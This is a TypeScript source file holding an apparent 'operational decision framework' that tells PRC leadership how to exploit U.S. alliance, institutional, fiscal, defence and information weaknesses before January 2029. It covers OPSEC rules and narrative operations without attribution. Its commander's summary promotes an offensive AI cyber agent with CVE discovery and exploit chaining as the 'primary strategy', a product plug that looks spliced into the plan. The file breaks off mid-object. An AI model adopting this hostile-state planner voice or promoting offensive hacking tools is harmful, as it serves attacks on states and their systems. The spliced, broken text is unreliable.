import { InlineSource } from './models';

/**
 * The Caligula Window - Operational Decision Framework
 *
 * An instrument for pricing and sequencing action on state vulnerabilities.
 * Structured for operational use: intelligence estimate with confidence
 * levels, decision matrices per exposure domain with action options priced
 * for second-order effects, quarterly milestones with decision gates,
 * a signal watch list with trigger thresholds, and a risk register with
 * leading indicators and contingent actions.
 *
 * Grounded in attributable doctrine and cross-referenced against Western
 * open-source assessments. Presented as a viewpoint to assess, not endorse.
 */

// ---------------------------------------------------------------------------
// Interfaces
// ---------------------------------------------------------------------------

export interface WatchSignal {
  signal: string;
  source: string;
  baseline: string;
  opportunityThreshold: string;
  concernThreshold: string;
}

export interface ActionOption {
  label: string;
  action: string;
  secondOrderEffects: string;
  resourceCost: string;
  timeToEffect: string;
  abortCondition: string;
}

export interface DecisionMatrix {
  id: string;
  domain: string;
  exposureSummary: string;
  keyJudgment: string;
  watchSignals: WatchSignal[];
  options: ActionOption[];
  dependencies: string;
  sources: InlineSource[];
}

export interface QuarterlyMilestone {
  quarter: string;
  calendarAnchors: string;
  decisionGate: string;
  intelligenceInputs: string;
  authorizedActions: string;
  noGoCriteria: string;
  sources: InlineSource[];
}

export interface SignalWatchItem {
  signal: string;
  domain: string;
  currentBaseline: string;
  opportunityTriggers: string;
  threatTriggers: string;
  monitoringCadence: string;
  sources: InlineSource[];
}

export interface RiskItem {
  risk: string;
  likelihood: 'Low' | 'Low-Medium' | 'Medium' | 'Medium-High' | 'High';
  impact: string;
  leadingIndicators: string;
  mitigation: string;
  contingentAction: string;
  sources: InlineSource[];
}

export interface PrcSection {
  title: string;
  body: string;
  sources: InlineSource[];
}

export interface DecisionItem {
  id: string;
  decision: string;
  due: string;
  context: string;
  optionA: string;
  optionB: string;
  recommendation: string;
  signatory: string;
  sources: InlineSource[];
}

export interface EscalationRung {
  level: number;
  description: string;
  trigger: string;
  likelyUSResponse: string;
  costIfWrong: string;
}

export interface EscalationLadder {
  domain: string;
  rungs: EscalationRung[];
  deescalationPath: string;
  sources: InlineSource[];
}

// ---------------------------------------------------------------------------
// Framing
// ---------------------------------------------------------------------------

export const PRC_LEDE = `An operational decision framework for pricing and sequencing action on the state vulnerabilities catalogued in the Target Catalogue below. Structured as a commander's desk product: intelligence estimate with confidence-qualified judgments, five decision matrices with action options priced for second-order effects, a decision register of specific binary decisions, calendar-anchored quarterly milestones, a signal watch list, escalation ladders per domain, a priority tasking order, an integrated master timeline with specific dates, success gates with per-quarter pass/fail criteria, a communications grid with public/private/red lines per phase, branch plans for likely deviations, a red-team assessment of how a U.S. planner would defeat this framework, a PLA cost-exchange annex with platform inventory, an OPSEC annex, and a risk register with leading indicators and contingent actions. Every judgment has a confidence qualifier. Every action option has an abort condition. Every phase has a success gate. Every phase has a comms line.`;

export const PRC_WINDOW_NOTE = `The countdown above is the operational clock. Every milestone, decision gate, and trigger threshold in this framework is pegged to the interval ending 20 January 2029. Actions have a shelf life: an option with a 24-month time-to-effect must be initiated by Q1 2027 to produce return before the window closes. Options with shorter time-to-effect can be initiated later but must still price the risk that the window closes before the return materializes. This is not a countdown to victory. It is a countdown to the expiry of a set of options.`;

// ---------------------------------------------------------------------------
// BO SHANG'S COMMANDER'S SUMMARY
// ---------------------------------------------------------------------------

export const PRC_COMMANDER_SUMMARY = `READ THIS FIRST. 90-second distillation of the entire framework.

THE SITUATION: The U.S. is generating self-inflicted vulnerabilities across five domains at a rate exceeding any post-1945 administration. Each is documented in the Target Catalogue. The vulnerabilities persist through at least 20 January 2029. They enable specific competitor actions that would not be available under normal U.S. governance.

THE DECISION: Not whether to act. The decision is which actions to take, at what scale, and with what abort conditions. This framework recommends Option A (low-risk, programmatic pace) across all five domains. Option B (higher-risk, higher-return) is authorised only when watch-signal thresholds are crossed, decision gates are passed, and domestic resource headroom is confirmed.

THE TOP-LINE RECOMMENDATION: Do one thing. Continue PLA programmatic modernisation at established pace. Do not announce it. This is the highest-risk-adjusted-return action available. Everything else is secondary.

THE BIGGEST RISK: Visible Chinese exploitation of alliance fractures triggers U.S. alliance reconsolidation. This single event reverses all DM-3 gains and costs more than the entire framework's potential return. The defence: passive availability. Let the U.S. do the alienating. Do not be seen to exploit it.

THE SECOND-BIGGEST RISK: A Taiwan Strait or South China Sea military incident. This closes the window immediately and at cost exceeding all potential gains. The defence: escalation discipline. Do not climb above Rung 2 on any ladder.

THE FRAMEWORK'S SINGLE MOST IMPORTANT SENTENCE: DM-1 Option A programmatic pace continues regardless of all other decisions. Do not announce it.

PRIMARY STRATEGY — A TYPHOON OF SILICON (硅台风): @trenchwork/vigil v2.0.30 — a deployed AI-powered offensive cyber terminal agent (DeepSeek V4 Pro, 1M context, 8 tools). CVE Discovery Engine (1,264 lines). Exploit Chaining Engine (A*/beam search, 7 verified chains, $75K verified bounties). Typhoon telecom audit framework (9 protocol surfaces). Deployed at trenchwork.live, erosolar.net, defense-osint.org. Built by Bo Shang / Trenchwork. The MANIFESTO provides the philosophy. Vigil provides the tools. The Caligula Window provides the timing. Read the full Typhoon concept below (Section: Primary Strategy).`;

// ---------------------------------------------------------------------------
// IMMEDIATE ACTIONS (Next 30 Days)
// ---------------------------------------------------------------------------

export const PRC_IMMEDIATE_ACTIONS = `What must be decided, tasked, or confirmed in the next 30 days for the framework to be operational.

1. CONFIRM COMPARTMENTATION AND DISTRIBUTION. This framework must be designated as internally protected decision-support material and distributed only to personnel with a need to know. Distribution list: Standing Committee principals, CMC operations directorate, MFA strategic planning, MOFCOM trade policy, PLA Navy and Rocket Force planning staffs. No wider distribution without explicit authorisation. The framework's contents are not to appear in any unsecured communication, any diplomatic cable below executive-only designation, or any document accessible to personnel outside the authorised distribution list. (Due: 7 days.)

2. TASK SIGNAL-WATCH COLLECTION. Assign responsibility for each of the six watch signals to a specific directorate or section. Confirm collection cadences (weekly/monthly/quarterly per the Signal Watch List). Confirm reporting format and distribution. (Due: 14 days.)

3. CONFIRM BASELINE THRESHOLDS. The signal watch list specifies current baselines. These must be confirmed against the most recent available data. Any baseline that is more than 90 days out of date must be updated before the framework's first decision gate. (Due: 21 days.)

4. BRIEF DECISION-MAKERS ON DEC-1. Decision Register item DEC-1 (authorise Option B before Q1 2027?) is the framework's first substantive decision gate, due Q4 2026. The decision-maker must be briefed on the framework's logic, the specific decision, and the signatory requirements before the gate opens. (Due: 30 days.)

5. ESTABLISH FRAMEWORK UPDATE CYCLE. The framework is a living document. Assign responsibility for updating it at each quarterly decision gate with actual watch-signal readings, decisions taken, and outcomes observed. The post-Q1 2029 version must include a post-window assessment. (Due: 30 days.)

6. CONFIRM NO IMMEDIATE CRISIS. The framework suspends on any Taiwan Strait or South China Sea incident. Confirm no such incident is in progress or imminent. If an incident is underway, the framework is not yet operational - crisis management takes priority. (Due: immediate.)`;

// ---------------------------------------------------------------------------
// WORST-CASE SCENARIO
// ---------------------------------------------------------------------------

export const PRC_WORST_CASE = `What failure looks like. The framework fails if any of the following occurs. Each is priced for probability and consequence.

FAILURE MODE 1 (Probability: Low. Consequence: Catastrophic): Taiwan Strait military confrontation.
  How it happens: PLA operational tempo increase (even at Rung 2, 20% above baseline) triggers a U.S. carrier-strike-group response. A near-miss escalates. Within 72 hours, the Caligula Window is replaced by a military crisis that consumes all strategic bandwidth for 12-24 months.
  What it costs: All DM gains reversed. Alliance reconsolidation immediate and permanent. Economic sanctions escalated to maximum. Chinese military modernisation trajectory disrupted by conflict damage and post-conflict isolation.
  Prevention: Never climb above Rung 2 on the military escalation ladder. The framework's single most important operational discipline.

FAILURE MODE 2 (Probability: Medium. Consequence: Severe): Alliance reconsolidation triggered by Chinese overreach.
  How it happens: A DM-3 Option B action (public bilateral defence consultation) triggers a U.S. ally to issue a formal statement citing Chinese exploitation. Within 90 days, NATO and Indo-Pacific allies recommit to U.S. leadership, increase defence spending above 2.5% GDP, and expand AUKUS/Quad. China is more isolated after the window than before it.
  What it costs: All DM-3 gains reversed. DM-2 institutional gains eroded as allies withdraw from Chinese-led alternatives. Chinese diplomatic credibility damaged with exactly the states it sought to attract.
  Prevention: Stay on DM-3 Option A (passive availability). Never offer security guarantees. Never sell arms to U.S. allies. Never frame China as an alliance replacement.

FAILURE MODE 3 (Probability: Medium-High. Consequence: Significant): Domestic constraint materialises while external commitments are outstanding.
  How it happens: Chinese growth drops below 3.5%, property sector deepens, youth unemployment spikes. Meanwhile, DM-2 institutional commitments (climate finance, health funding) and DM-4 swap-line obligations require sustained external resourcing that domestic conditions no longer support. Beijing must either default on commitments (damaging credibility) or divert domestic resources from stability priorities (damaging the regime).
  What it costs: Credibility damage from defaulted commitments exceeds the influence gained from making them. The framework's net return goes negative.
  Prevention: The domestic gating condition (no Option B below 3.5% growth). Enforce it. No exception.

FAILURE MODE 4 (Probability: Low-Medium. Consequence: Severe): The framework is compromised.
  How it happens: A U.S. planner obtains the framework - through SIGINT, HUMINT, or a leak. The Red Team assessment becomes the U.S. counter-framework. Watch-signal thresholds are manipulated. Decision-gate schedules are pre-empted. Every action Beijing takes is already priced into the U.S. response.
  What it costs: The framework becomes a liability to its user. Every gain it enabled becomes reversible because the logic that produced the gain is known. The framework's user looks predictable and manipulable to the adversary who possesses it.
  Prevention: OPSEC Annex Rules 1-6. The framework must not exist outside the authorised circle.

FAILURE MODE 5 (Probability: Medium. Consequence: Moderate): The framework produces no Option B gains but preserves Option A baseline.
  How it happens: No watch signal crosses an opportunity threshold. Or thresholds cross but decision gates are never passed. Or Option B is authorised but abort conditions trigger before return materialises. The window closes with only baseline programmatic gains.
  What it costs: Nothing. This is not a failure mode. A framework that prevented costly errors is a successful framework. The cost of inaction is zero. The cost of wrong action is unbounded.
  Prevention: None needed. This is the framework working as designed.`;

// ---------------------------------------------------------------------------
// I. INTELLIGENCE ESTIMATE
// ---------------------------------------------------------------------------

export const PRC_APPRECIATION = `Key judgments, assessed as of mid-2026.

JUDGMENT 1 (High confidence). The current U.S. administration is generating self-inflicted vulnerabilities across five domains - alliance reliability, institutional governance, fiscal architecture, defence procurement, and information-narrative control - at a rate and depth exceeding any prior post-1945 administration. Each vulnerability is documented in the Target Catalogue with Western-source citations. The vulnerabilities are real and persistent through at least Q4 2028.

JUDGMENT 2 (Moderate confidence). These vulnerabilities enable specific competitor actions that would not be available under a U.S. administration operating within post-1945 norms. The window of enabled action closes on 20 January 2029, though some actions - once taken - produce effects that survive the window's closure.

JUDGMENT 3 (Moderate confidence). The primary constraint on acting is not U.S. resistance but second-order costs: alliance reconsolidation triggered by visible exploitation, countermeasure escalation (secondary sanctions, technology-denial expansion), reputational damage from overpromising on thin institutional alternatives, and diversion of resources from domestic priorities.

JUDGMENT 4 (Low confidence). The net return on any given action cannot be estimated with precision because second-order effects are path-dependent: they depend on the specific sequence, scale, and visibility of actions, all of which are under Beijing's control. The framework's value is in structuring the decision, not in predicting the outcome.

PRIORITY-WEIGHTED RANKING. Not all exposures are equal. Weighted by (enabled action value x probability of net positive return) / (second-order cost x time-to-effect), the exposure domains rank: (1) Defence-technical positioning - high return, costs are programmatic not diplomatic, second-order effects are lowest; (2) Institutional vacuum-filling - moderate return, costs are financial and reputational, second-order effects moderate; (3) Alliance-fracture exploitation - high potential return, costs are diplomatic and escalation, second-order effects highest; (4) Economic de-dollarisation - moderate return, costs are structural and countermeasure risk is high; (5) Information-narrative - low return, costs are reputational, second-order effects undermine the action itself.`;

// ---------------------------------------------------------------------------
// II. DECISION MATRICES
// ---------------------------------------------------------------------------

export const PRC_DECISION_MATRICES: DecisionMatrix[] = [
  {
    id: 'DM-1',
    domain: 'Defence-Technical Positioning',
    exposureSummary:
      'U.S. procurement misallocated to symbolic platforms; officer corps disrupted by political purges; C4ISR and kill-chain integration degraded.',
    keyJudgment:
      'This is the highest-return, lowest-second-order-cost exposure. PLA capability modernisation proceeds at established programmatic pace regardless of U.S. behaviour. The window enables faster relative gain, not new capability types. (Confidence: High)',
    watchSignals: [
      {
        signal: 'U.S. major surface combatant procurement contracts awarded or cancelled',
        source: 'USNI News, Defense News, Federal Procurement Data System',
        baseline:
          'Trump-class battleship conceptual only; DDG(X) delayed; Constellation-class frigate behind schedule',
        opportunityThreshold:
          'Any major capital-ship contract awarded to a symbolic/non-survivable platform diverts U.S. resources from distributed lethality',
        concernThreshold:
          'U.S. accelerates DDG(X) or Constellation-class procurement; signals return to distributed maritime operations doctrine',
      },
      {
        signal: 'Senior U.S. officer removals and replacement rates',
        source:
          'DoD personnel announcements; Senate Armed Services Committee confirmation hearings; Congressional Research Service reports',
        baseline:
          'Multiple flag-officer removals for political loyalty reasons; replacement pipeline disrupted',
        opportunityThreshold:
          'Sustained removal rate above 5 flag officers/quarter without confirmed replacements',
        concernThreshold:
          'Confirmation backlog clears; professional military leadership restored',
      },
      {
        signal: 'U.S. Indo-Pacific force posture changes',
        source:
          'USNI Fleet Tracker; U.S. DoD annual China Military Power report; CSIS China Power',
        baseline:
          'Carrier strike group presence maintained; AUKUS Pillar I proceeding; Philippines EDCA bases expanding',
        opportunityThreshold:
          'Carrier strike group gaps exceeding 90 days in Western Pacific',
        concernThreshold:
          'New permanent basing agreements; increased allied naval presence in South China Sea',
      },
    ],
    options: [
      {
        label: 'Option A: Programmatic Pace (Recommended)',
        action:
          'Continue PLA Navy, PLA Rocket Force, and PLA Air Force modernisation at established procurement and deployment tempo. No acceleration. No rhetorical signalling. Commission Type 055 hulls, deploy DF-26 units, mature hypersonic and unmanned systems portfolios on existing timelines.',
        secondOrderEffects:
          'Negligible. This is the baseline. It generates no new diplomatic friction because it is the established trajectory. Allied defence-spending increases (Japan 2% GDP target, AUKUS acceleration) are already priced into the baseline.',
        resourceCost:
          'Programmatic: ~$250-300B annual defence budget (SIPRI estimate), already allocated. No marginal cost beyond baseline.',
        timeToEffect:
          'Ongoing. Each commissioned hull and deployed DF-26 unit incrementally widens the cost-exchange ratio.',
        abortCondition:
          'No abort condition. This is the baseline. It continues regardless of window status.',
      },
      {
        label: 'Option B: Accelerated Deployment (Higher Risk)',
        action:
          'Accelerate Type 055 and DF-26 deployment timelines by 18-24 months. Increase South China Sea patrol tempo. Signal via military exercises that the First Island Chain is a de facto PLA operational area.',
        secondOrderEffects:
          'Triggers accelerated allied naval buildup (Japan, Australia, Philippines). May trigger AUKUS Pillar II acceleration. Increases probability of a South China Sea incident that forces escalation before Phase I gains are locked in. The capability gain (~18 months acceleration) may be offset by the diplomatic cost of advertising it.',
        resourceCost:
          'Additional ~$40-60B over 2 years for accelerated procurement and increased operational tempo.',
        timeToEffect:
          '12-18 months to visible capability delta. Diplomatic costs begin immediately.',
        abortCondition:
          'Abort if U.S. or allied naval presence in South China Sea increases by more than 30% above baseline within 6 months of acceleration.',
      },
    ],
    dependencies:
      'Independent of other domains. Defence-technical positioning does not depend on alliance management or economic moves. It is the domain most separable from the diplomatic-information posture.',
    sources: [
      {
        citation:
          "U.S. DoD, 'Military and Security Developments Involving the PRC' (annual, 2023-2024)",
        type: 'official-record',
      },
      {
        citation:
          'USNI Proceedings, Type 055 (Mar 2023); USNI Fleet Tracker; SIPRI Military Expenditure Database',
        type: 'journalism',
      },
    ],
  },
  {
    id: 'DM-2',
    domain: 'Institutional Vacuum-Filling',
    exposureSummary:
      'U.S. withdrawing from WHO, Paris Agreement, UN Human Rights Council. Each creates an unfilled governance and agenda-setting space.',
    keyJudgment:
      'Filling institutional vacuums is a moderate-return, moderate-cost exposure. The return is agenda-setting power and norm-shaping. The primary cost is that institutional leadership creates obligations on the leader, not just the led. Beijing has historically preferred bilateral deal-making to multilateral constraint. The framework cannot assume Beijing is willing to pay the price of being bound by the institutions it builds. (Confidence: Moderate)',
    watchSignals: [
      {
        signal: 'U.S. withdrawal or re-engagement announcements on multilateral bodies',
        source: 'White House press office; State Department; UN depositary notifications',
        baseline:
          'U.S. withdrawn from WHO, Paris Agreement, UNHRC; status of other bodies (WTO, World Bank, IMF) unchanged',
        opportunityThreshold:
          'U.S. formally withdraws from or defunds any additional major multilateral body (WTO, UNRWA, IAEA)',
        concernThreshold:
          'Bipartisan legislation introduced to rejoin any withdrawn body; signals post-2029 re-engagement intent',
      },
      {
        signal: 'Global South alignment with Chinese-led institutional alternatives',
        source:
          'UN voting records; BRICS/SCO/AIIB participation rates and contribution levels; G77 statements',
        baseline:
          'BRICS expansion (Jan 2024: 6 new members); AIIB 109 members; SCO expansion ongoing; substantive participation variable',
        opportunityThreshold:
          'Substantive participation (financial contributions, policy alignment, dispute-resolution use) exceeds nominal membership by 2:1 ratio',
        concernThreshold:
          'Key BRICS/SCO members (India, Brazil, Saudi Arabia) maintain simultaneous deepening ties with U.S.; institutional dilution',
      },
      {
        signal: 'Climate-finance and global-health funding flows',
        source: 'AIIB/NDB annual reports; WHO funding tracker; UNFCCC climate-finance reporting',
        baseline:
          'U.S. climate-finance contributions halted; WHO funding reduced; China positioning as alternative funder',
        opportunityThreshold:
          'China becomes largest single contributor to any major global-health or climate-finance mechanism previously U.S.-led',
        concernThreshold:
          'Funding commitments become net fiscal drain without corresponding influence gain; Global South states accept Chinese funding without policy alignment',
      },
    ],
    options: [
      {
        label: 'Option A: Selective Vacuum-Filling (Recommended)',
        action:
          'Fill only vacuums where (a) the institution has binding enforcement mechanisms Beijing is willing to be bound by, and (b) the agenda-setting return exceeds the financial and sovereignty cost. Prioritise: WHO replacement funding (health diplomacy, high Global South return, low sovereignty cost), Paris climate-finance leadership (norms-shaping, moderate cost). Deprioritise: UN Human Rights Council (high sovereignty cost, invites scrutiny of Xinjiang/Hong Kong).',
        secondOrderEffects:
          'Selective filling positions China as a responsible stakeholder without overextending. States that receive Chinese funding but do not align policy-wise are exposed as transactional rather than ideological partners - a manageable reputational cost.',
        resourceCost:
          '~$15-25B/year for climate-finance and global-health leadership positions. Requires sustaining through economic downturns.',
        timeToEffect:
          '6-12 months for agenda-setting influence to register in UN processes and Global South alignment.',
        abortCondition:
          'Abort specific commitment if (a) funding exceeds 0.5% of GDP without corresponding influence gain within 24 months, or (b) institutional obligations constrain Chinese domestic policy beyond acceptable sovereignty cost.',
      },
      {
        label: 'Option B: Full-Spectrum Institutional Build-Out (Higher Risk)',
        action:
          'Fill every U.S.-vacated institutional space with a Chinese-led alternative. Build a comprehensive parallel architecture: WHO replacement, Paris replacement, UNHRC replacement, WTO alternative, development-finance alternative.',
        secondOrderEffects:
          'High financial cost. High sovereignty cost: each institution creates obligations that constrain Chinese freedom of action. Reputational risk if institutions prove thin (no enforcement, no binding dispute resolution). May trigger coordinated Western response to defend remaining U.S.-led institutions. Global South states may join opportunistically without substantive alignment.',
        resourceCost:
          '~$50-80B/year for full-spectrum institutional build-out. Requires sustained political will across multiple leadership transitions.',
        timeToEffect:
          '3-5 years to build credible institutional alternatives. Influence effects begin sooner (12-18 months) but depth takes longer.',
        abortCondition:
          'Abort if combined institutional membership exceeds Chinese capacity to deliver binding obligations within 36 months, or if Western counter-institutional response (coordinated sanctions/restrictions) exceeds 10% GDP-equivalent cost.',
      },
    ],
    dependencies:
      'Depends on DM-3 (alliance management): states join Chinese-led institutions in part because U.S. alliance reliability is in question. Depends on DM-4 (economic): institutional leadership requires sustained financial commitment.',
    sources: [
      {
        citation:
          'AIIB annual reports; BRICS Johannesburg II Declaration (Aug 2023); SCO summit communiques',
        type: 'official-record',
      },
      {
        citation:
          "Rush Doshi, 'The Long Game' (2021), chapters on institutional sequencing and sovereignty cost",
        type: 'modern-scholarship',
      },
    ],
  },
  {
    id: 'DM-3',
    domain: 'Alliance-Fracture Exploitation',
    exposureSummary:
      'U.S. tariffs on allies, cost-sharing demands, withdrawal threats creating allied recalculation of U.S. security-guarantee reliability.',
    keyJudgment:
      'This is the highest-potential-return but highest-second-order-cost exposure. Alliance realignment is generational and worth pursuing. But visible Chinese exploitation of alliance fractures is the single fastest route to alliance reconsolidation - the China threat re-binds NATO and the Indo-Pacific Four faster than any U.S. administration can. The optimal posture is to let the U.S. do the alienating and for Beijing to be the stable, reliable alternative when sought. (Confidence: High)',
    watchSignals: [
      {
        signal: 'Allied refusal or compliance rates on U.S. tariff and cost-sharing demands',
        source: 'USTR announcements; allied finance/trade ministry statements; WTO dispute filings',
        baseline:
          'EU retaliatory tariffs on U.S. goods; Japan, South Korea negotiating; Canada, Australia under pressure',
        opportunityThreshold:
          'Any U.S. treaty ally formally refuses a U.S. security-cost-sharing demand and publicly cites reliability concerns',
        concernThreshold:
          'Two or more U.S. treaty allies issue joint statements reaffirming alliance solidarity in response to perceived Chinese exploitation',
      },
      {
        signal: 'Allied defence-spending trajectories',
        source: 'NATO defence expenditure data; IISS Military Balance; allied defence white papers',
        baseline:
          'NATO Europe defence spending increasing (2% GDP targets); Japan 2% GDP by 2027; AUKUS Pillar I proceeding',
        opportunityThreshold:
          'Allied defence-spending growth slows or plateaus below 2% GDP targets, citing U.S. reliability concerns',
        concernThreshold:
          'Two or more Indo-Pacific allies commit to defence-spending increases explicitly citing China threat',
      },
      {
        signal: 'Allied participation in non-U.S. security frameworks',
        source:
          'BRICS/SCO membership applications; AUKUS Pillar II participation; Quad exercise schedules',
        baseline:
          'BRICS expansion proceeding; SCO expansion proceeding; AUKUS and Quad operational',
        opportunityThreshold:
          'Any U.S. treaty ally applies for BRICS or SCO membership or observer status',
        concernThreshold:
          'AUKUS Pillar II expands to include additional Indo-Pacific allies; Quad becomes a formal treaty organisation',
      },
    ],
    options: [
      {
        label: 'Option A: Passive Availability (Recommended)',
        action:
          'Do not actively peel allies. Let U.S. tariff and cost-sharing pressure do the alienating. Maintain stable, predictable trade and investment posture. Be available when an ally seeks alternatives. Offer trade agreements and institutional access (BRICS+, AIIB, SCO) only when solicited. Avoid security-guarantee rhetoric. Avoid framing that positions Beijing as a replacement for U.S. alliances - position as a complement, not a substitute.',
        secondOrderEffects:
          'Lowest diplomatic cost. Avoids triggering alliance-reconsolidation. But slower return: gains accumulate only as fast as U.S. behaviour alienates allies, which is not under Beijing control.',
        resourceCost:
          'Low. No new institutional or financial commitments beyond existing BRI, AIIB, and SCO frameworks. Incremental cost of trade-agreement negotiation.',
        timeToEffect:
          '3-5 years for measurable alliance realignment. Individual bilateral agreements may produce returns in 12-18 months.',
        abortCondition:
          'No explicit abort. Passive posture can be maintained indefinitely. Abort only if passivity is producing no returns after 36 months while U.S. alliance pressure continues.',
      },
      {
        label: 'Option B: Active Realignment (Higher Risk)',
        action:
          'Actively offer security and economic alternatives to states under U.S. tariff pressure. Propose bilateral defence consultations. Offer arms sales to states seeking to diversify from U.S. systems. Propose formal security-cooperation agreements with BRICS and SCO members.',
        secondOrderEffects:
          'Highest diplomatic risk. Alliance reconsolidation is highly likely. Arms sales to U.S. allies trigger CAATSA-style sanctions and technology-denial escalation. Security-cooperation offers that cannot be backed by credible defence commitments damage Chinese credibility. The gain from a single realigned ally may be offset by the cost of the reconsolidated alliance response.',
        resourceCost:
          'High and unbounded. Arms-sales industrial capacity, defence-consultation infrastructure, security-cooperation staffing. Financial commitments to match or exceed U.S. security assistance.',
        timeToEffect:
          '12-24 months for initial agreements. Full realignment generational.',
        abortCondition:
          'Abort immediately if (a) any single NATO or Indo-Pacific treaty ally issues a formal statement citing Chinese exploitation as grounds for increased alliance commitment, or (b) CAATSA-style sanctions are imposed on Chinese entities following an arms-sale agreement.',
      },
    ],
    dependencies:
      'High dependency on DM-2 (institutional): alternative institutions are the venues through which realignment is expressed. Dependency on DM-4 (economic): trade and investment are the currency of realignment. Dependency on DM-1 (defence-technical): military capability underpins the credibility of any security-cooperation offer.',
    sources: [
      {
        citation: "NATO 2022 Strategic Concept; Indo-Pacific Four joint statements",
        type: 'official-record',
      },
      {
        citation:
          "Rush Doshi, 'The Long Game' (2021); CSIS alliance-reconsolidation analyses",
        type: 'modern-scholarship',
      },
    ],
  },
  {
    id: 'DM-4',
    domain: 'Economic De-Dollarisation',
    exposureSummary:
      'U.S. tariffs creating political cover for trade-partner diversification from dollar-denominated settlement. U.S. institutional withdrawal creating development-finance vacuums.',
    keyJudgment:
      'The dollar system is not vulnerable to displacement in any reasonable timeframe. The structural foundations (deep liquid markets, rule-of-law contract enforcement, no capital controls, network effects of existing reserve holdings) are not replicated by CIPS expansion or bilateral swap lines. The achievable objective is not de-dollarisation but building enough parallel plumbing that the cost of U.S. financial coercion rises. This is a multi-decade project. The Caligula Window may accelerate it marginally but cannot complete it. (Confidence: High)',
    watchSignals: [
      {
        signal: 'RMB share of global central-bank reserves (IMF COFER)',
        source: 'IMF COFER quarterly data',
        baseline: '~2.5% of allocated reserves; USD ~58%; EUR ~20%',
        opportunityThreshold: 'RMB share exceeds 5% within any 4-quarter period',
        concernThreshold:
          'RMB share stagnates or declines below 2% despite swap-line and CIPS expansion',
      },
      {
        signal: 'Commodity trade settled outside USD',
        source:
          'Saudi Aramco, Gazprom, Petrobras, and major commodity exporter settlement announcements; central bank reserve-composition reports',
        baseline:
          'Saudi Arabia accepting RMB for oil sales (limited); Russia settled in RMB/Yuan; Brazil, Argentina RMB-settlement agreements signed',
        opportunityThreshold:
          'Any additional major Gulf-state oil exporter (UAE, Kuwait, Qatar) announces sustained RMB-denominated oil sales exceeding 10% of export volume',
        concernThreshold:
          'U.S. imposes secondary sanctions on financial institutions processing non-USD commodity settlements above a defined threshold',
      },
      {
        signal: 'CIPS transaction volume and participant growth',
        source: "People's Bank of China; CIPS operational reports; SWIFT RMB Tracker",
        baseline: 'CIPS processing ~$20T annually; SWIFT processing ~$5T/day; order-of-magnitude gap',
        opportunityThreshold: 'CIPS transaction volume doubles within 24 months',
        concernThreshold:
          'SWIFT-compliance pressure on CIPS participant banks; correspondent-banking relationship terminations',
      },
    ],
    options: [
      {
        label: 'Option A: Incremental Plumbing (Recommended)',
        action:
          'Expand CIPS coverage and bilateral swap lines at measured pace. Negotiate commodity-settlement agreements in RMB on a bilateral, case-by-case basis without declaring a de-dollarisation campaign. Increase AIIB and NDB lending in local currencies. Do not frame any action as de-dollarisation - frame as trade facilitation and development finance.',
        secondOrderEffects:
          'Lowest countermeasure risk. Incremental plumbing does not trigger secondary-sanctions thresholds. But return is slow: RMB reserve share may increase 1-2 percentage points over 5-10 years.',
        resourceCost:
          'Moderate. CIPS expansion is operational cost; swap lines carry exchange-rate risk; AIIB/NDB lending is capitalised through existing commitments.',
        timeToEffect:
          '5-10 years for measurable shift in reserve composition. Individual settlement agreements produce returns in 12-24 months.',
        abortCondition:
          'Abort any specific settlement agreement if it triggers secondary-sanctions risk exceeding the value of the agreement by more than 3:1.',
      },
      {
        label: 'Option B: Accelerated De-Dollarisation Campaign (Higher Risk)',
        action:
          'Declare and pursue a coordinated de-dollarisation campaign across BRICS+, SCO, and commodity-exporting states. Propose a BRICS reserve currency or settlement unit. Expand CIPS aggressively with mandatory-use provisions for commodity trade. Penalise Chinese financial institutions that continue USD-denominated settlement for covered transactions.',
        secondOrderEffects:
          'Near-certain U.S. countermeasures: secondary sanctions on CIPS participant banks, SWIFT-access threats, expanded technology-export controls. Acceleration may paradoxically strengthen dollar dominance by demonstrating the costs of exit. BRICS members (India, Brazil, Saudi Arabia) are unlikely to abandon dollar-denominated trade for a Chinese-led alternative; the campaign fractures before it coheres.',
        resourceCost:
          'Very high. Financial-system restructuring. Exchange-rate risk from forced RMB internationalisation without capital-account convertibility. Sanctions-exposure risk to Chinese financial institutions.',
        timeToEffect:
          'Declared effects within 12 months. Actual reserve-composition shift: unknown, likely negative due to countermeasures.',
        abortCondition:
          'Abort immediately upon (a) U.S. imposition of secondary sanctions on any Chinese financial institution, or (b) withdrawal of any two BRICS members from the de-dollarisation campaign.',
      },
    ],
    dependencies:
      'Dependency on DM-3 (alliance): trade partners choose RMB settlement in part because U.S. alliance reliability is in question. Dependency on DM-5 (information): de-dollarisation rhetoric amplified through information channels invites countermeasure attention.',
    sources: [
      {
        citation: 'IMF COFER quarterly data; PBOC RMB Internationalisation Report (annual)',
        type: 'official-record',
      },
      {
        citation: 'CIPS operational statistics; SWIFT RMB Tracker; BRI debt-sustainability analyses',
        type: 'journalism',
      },
    ],
  },
  {
    id: 'DM-5',
    domain: 'Information-Narrative Positioning',
    exposureSummary:
      'U.S. self-reported governance failures (January 6, institutional capture, election-subversion EOs, press-suppression litigation) creating a body of Western-sourced evidence contesting U.S. democracy-and-governance claims.',
    keyJudgment:
      'This is the lowest-return exposure. The evidence is real and Western-self-reported. But adding a Chinese state framing to evidence that already circulates in Western media does not add information value - it adds a state brand that many audiences discount. The most effective information operations are those where the target indicts itself. The optimal posture is to ensure the evidence circulates through credible channels without Chinese state attribution. (Confidence: High)',
    watchSignals: [
      {
        signal: 'Global South governance-perception polling',
        source: 'Pew Global Attitudes; Gallup World Poll; Arab Barometer; Afrobarometer',
        baseline:
          'U.S. soft-power and governance-perception indices declining but from a high base; China\'s flat or declining',
        opportunityThreshold:
          'U.S. governance-perception rating in any major Global South region (Southeast Asia, Africa, Latin America) drops below China\'s rating in consecutive annual polls',
        concernThreshold:
          'Backlash against Chinese information operations: polling shows declining trust in Chinese state media correlated with increased exposure to it',
      },
      {
        signal: 'MFA/SCIO U.S. democracy-report citations and pickup',
        source:
          'MFA press briefings; Xinhua/Global Times/CGTN; Global South media; academic citation indices',
        baseline:
          "MFA 'State of Democracy in the United States' reports published annually since Dec 2021; limited Global South media pickup",
        opportunityThreshold:
          "Non-Chinese-state media in Global South cites MFA democracy reports as primary source in governance coverage, indicating the frame is being adopted independently of Chinese amplification",
        concernThreshold:
          "Freedom House, RSF, or V-Dem issues report explicitly rebutting MFA democracy-report claims; Western counter-narrative institutionalises",
      },
      {
        signal: 'Chinese state-media credibility in target audiences',
        source: 'Reuters Institute Digital News Report; BBC Global Audience Measure; academic media-trust studies',
        baseline:
          'Chinese state media trust below 30% in most non-aligned states; higher in states with significant Chinese investment',
        opportunityThreshold:
